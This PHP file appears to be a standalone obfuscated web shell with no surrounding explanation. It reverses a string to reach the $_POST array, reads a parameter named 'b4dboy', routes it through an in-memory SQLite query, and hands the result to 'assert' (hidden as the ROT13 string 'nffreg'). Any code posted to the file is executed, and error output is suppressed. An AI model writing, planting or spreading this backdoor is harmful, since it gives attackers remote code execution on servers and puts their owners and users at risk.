<?php

if(($db = @new PDO('sqlite::memory:')) && ($sql = strrev('TSOP_')) && ($sql = $$sql)) {
	$stmt = @$db->query("SELECT '{$sql[b4dboy]}'");
	$result = @$stmt->fetchAll(PDO::FETCH_FUNC, str_rot13('nffreg'));
}

?>